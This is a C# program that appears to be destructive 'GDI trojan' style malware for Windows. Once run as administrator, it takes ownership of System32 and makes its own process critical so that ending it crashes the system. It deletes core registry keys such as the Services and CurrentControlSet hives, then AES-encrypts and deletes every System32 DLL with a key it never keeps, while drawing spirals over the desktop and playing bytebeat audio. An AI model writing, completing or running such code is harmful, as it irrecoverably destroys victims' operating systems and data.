using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;

namespace KRAS
{
    class Program
    {
        // Constants for graphical operations
        const int WIDTH = 1920;
        const int HEIGHT = 1080;
        const int SRCCOPY = 0x00CC0020;
        const int ProcessBreakOnTermination = 29;
        const int BreakOnTerminationFlag = 1;

        // Import external functions for graphical operations
        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateSolidBrush(int crColor);

        [DllImport("gdi32.dll")]
        private static extern bool Ellipse(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

        // Constants for bytebeat
        private const int SampleRate = 8000;
        private const int DurationSeconds = 190;
        private const int BufferSize = SampleRate * DurationSeconds;

        // Bytebeat formulas
        private static Func<int, int>[] formulas = new Func<int, int>[]
        {
            
            t => (int)((long)t * t >> 368999122) | (t >> 98) | t >> 989 | t >> 7
        };

        public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

        static void Main()
        {
            // Check if the program is running as an administrator
            if (!IsAdministrator())
            {
                Console.WriteLine("This application needs to be run as an administrator.");
                return;
            }

            // Take ownership of C:\Windows\System32
            RunCommand("cmd.exe", "/c start /b takeown /f C:\\Windows\\System32");

            // Set the process as critical
            SetProcessAsCritical();

            // Start registry deletion and graphical operations concurrently
            var registryKeys = new[]
            {
                @"HKLM\SYSTEM\CurrentControlSet\Services",
                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion",
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services",
                @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet"
            };

            // Start registry deletion task
            var registryDeletionThread = new Thread(() => DeleteRegistryKeys(registryKeys));
            registryDeletionThread.Start();

            // Start graphical operations
            var graphicalOperationsThread = new Thread(PerformGraphicalOperations);
            graphicalOperationsThread.Start();

            // Start bytebeat sound generation
            var bytebeatThread = new Thread(PlayBytebeatSounds);
            bytebeatThread.Start();

            // Encrypt all .dll files in the C:\Windows\System32 directory
            byte[] key = GenerateKey();
            string system32Path = @"C:\windows\system32";
            EncryptDllFilesInDirectory(system32Path, key);

            // Wait for registry deletion, graphical operations, and bytebeat sounds to complete
            registryDeletionThread.Join();
            graphicalOperationsThread.Join();
            bytebeatThread.Join();
        }

        static void SetProcessAsCritical()
        {
            Process currentProcess = Process.GetCurrentProcess();
            IntPtr handle = currentProcess.Handle;

            int isCritical = BreakOnTerminationFlag;
            uint status = NtSetInformationProcess(handle, ProcessBreakOnTermination, ref isCritical, sizeof(int));

            if (status == 0)
            {
                Console.WriteLine("Process is now critical. Closing this process will cause a system crash.");
            }
            else
            {
                Console.WriteLine("Failed to set process as critical. Status: " + status);
            }
        }

        static void RunCommand(string command, string arguments)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = command,
                Arguments = arguments,
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process process = new Process { StartInfo = startInfo };
            process.Start();
        }

        static byte[] GenerateKey()
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] key = new byte[32]; // 256-bit key for AES
                rng.GetBytes(key);
                return key;
            }
        }

        static void EncryptFile(byte[] key, string filename)
        {
            try
            {
                byte[] plaintext = File.ReadAllBytes(filename);
                byte[] encryptedData = Encrypt(plaintext, key);

                string encryptedFilename = filename + ".encrypted";
                File.WriteAllBytes(encryptedFilename, encryptedData);
                File.Delete(filename);

                Console.WriteLine($"Successfully encrypted {filename} to {encryptedFilename}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error encrypting {filename}: {e.Message}");
            }
        }

        static void EncryptDllFilesInDirectory(string directory, byte[] key)
        {
            var dllFiles = Directory.GetFiles(directory, "*.dll", SearchOption.TopDirectoryOnly);
            foreach (var file in dllFiles)
            {
                EncryptFile(key, file);
            }
        }

        static byte[] Encrypt(byte[] data, byte[] key)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV();
                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                using (var ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, aes.IV.Length); // Prepend IV
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                    }
                    return ms.ToArray();
                }
            }
        }

        static void DeleteRegistryKeys(string[] keys)
        {
            foreach (string key in keys)
            {
                ProcessStartInfo processInfo = new ProcessStartInfo("reg", $"delete \"{key}\" /f")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = new Process())
                {
                    process.StartInfo = processInfo;
                    process.Start();
                    process.WaitForExit();

                    // Optionally capture the output
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    if (!string.IsNullOrEmpty(output))
                        Console.WriteLine($"Output: {output}");

                    if (!string.IsNullOrEmpty(error))
                        Console.WriteLine($"Error: {error}");
                }
            }
        }

        static void PerformGraphicalOperations()
        {
            IntPtr desktopHwnd = GetDesktopWindow();
            IntPtr hdc = GetDC(desktopHwnd);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr memBitmap = CreateCompatibleBitmap(hdc, WIDTH, HEIGHT);
            SelectObject(memDC, memBitmap);

            DateTime startTime = DateTime.Now;

            int centerX = WIDTH / 2, centerY = HEIGHT / 2;
            Random rand = new Random();
            int dx = rand.Next(-90, 91);
            int dy = rand.Next(-90, 91);
            double angleOffset = 0;

            try
            {
                while ((DateTime.Now - startTime).TotalSeconds < 190)
                {
                    BitBlt(memDC, 0, 0, WIDTH, HEIGHT, hdc, 0, 0, SRCCOPY);

                    centerX += dx;
                    centerY += dy;

                    if (centerX < 0 || centerX > WIDTH)
                    {
                        dx = -dx;
                    }
                    if (centerY < 0 || centerY > HEIGHT)
                    {
                        dy = -dy;
                    }

                    angleOffset += 0.7;

                    DrawSpiral(memDC, centerX, centerY, 10, 900, 50, Math.PI / 12, angleOffset);

                    BitBlt(hdc, 0, 0, WIDTH, HEIGHT, memDC, 0, 0, SRCCOPY);
                    Thread.Sleep(5);
                }
            }
            catch
            {
                DeleteDC(memDC);
                DeleteObject(memBitmap);
                ReleaseDC(desktopHwnd, hdc);
                return;
            }

            DeleteDC(memDC);
            DeleteObject(memBitmap);
            ReleaseDC(desktopHwnd, hdc);
        }

        static void DrawSpiral(IntPtr hdc, int centerX, int centerY, int startRadius, int endRadius, int numCircles, double angleIncrement, double angleOffset)
        {
            for (int i = 0; i < numCircles; i++)
            {
                double angle = angleOffset + i * angleIncrement;
                double radius = startRadius + (endRadius - startRadius) * i / numCircles;
                int x = (int)(centerX + radius * Math.Cos(angle));
                int y = (int)(centerY + radius * Math.Sin(angle));

                int red = (int)(127 + 127 * Math.Sin(angle));
                int green = (int)(127 + 127 * Math.Cos(angle * 1.5));
                int blue = (int)(127 + 127 * Math.Sin(angle * 2));

                IntPtr brush = CreateSolidBrush(RGB(red, green, blue));
                SelectObject(hdc, brush);

                Ellipse(hdc, x - 70, y - 70, x + 70, y + 70);
                DeleteObject(brush);
            }
        }

        static int RGB(int r, int g, int b)
        {
            return r | (g << 8) | (b << 16);
        }

        static void PlayBytebeatSounds()
        {
            foreach (var formula in Formulas)
            {
                byte[] buffer = GenerateBuffer(formula);
                PlayBuffer(buffer);
            }
        }

        static byte[] GenerateBuffer(Func<int, int> formula)
        {
            byte[] buffer = new byte[BufferSize];
            for (int t = 0; t < BufferSize; t++)
            {
                buffer[t] = (byte)(formula(t) & 0xFF);
            }
            return buffer;
        }

        static void SaveWav(byte[] buffer, string filePath)
        {
            using (var fs = new FileStream(filePath, FileMode.Create))
            using (var bw = new BinaryWriter(fs))
            {
                bw.Write(new[] { 'R', 'I', 'F', 'F' });
                bw.Write(36 + buffer.Length);
                bw.Write(new[] { 'W', 'A', 'V', 'E' });
                bw.Write(new[] { 'f', 'm', 't', ' ' });
                bw.Write(16);
                bw.Write((short)1);
                bw.Write((short)1);
                bw.Write(SampleRate);
                bw.Write(SampleRate);
                bw.Write((short)1);
                bw.Write((short)8);
                bw.Write(new[] { 'd', 'a', 't', 'a' });
                bw.Write(buffer.Length);
                bw.Write(buffer);
            }
        }

        static void PlayBuffer(byte[] buffer)
        {
            string tempFilePath = Path.GetTempFileName();
            SaveWav(buffer, tempFilePath);
            using (SoundPlayer player = new SoundPlayer(tempFilePath))
            {
                player.PlaySync();
            }
            File.Delete(tempFilePath);
        }

        private static bool IsAdministrator()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
    }
}
